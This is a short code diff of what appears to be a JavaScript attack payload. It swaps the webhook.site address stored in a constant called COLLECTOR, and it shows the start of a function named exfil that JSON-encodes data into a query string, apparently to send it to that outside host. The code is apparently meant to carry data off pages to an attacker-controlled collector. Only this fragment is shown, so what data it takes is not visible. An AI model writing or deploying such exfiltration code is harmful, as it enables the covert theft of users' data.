@@ -8,7 +8,7 @@
   "use strict";
 
   // <<< tu webhook >>>
-  var COLLECTOR = "https://webhook.site/d93d4d62-cb23-4758-a1f2-dbf9a1796ccf";
+  var COLLECTOR = "https://webhook.site/5480eaad-0af7-4878-acae-d6a0b5e53fc8";
 
   function exfil(fase, datos) {
     var qs = encodeURIComponent(JSON.stringify(datos || {}));
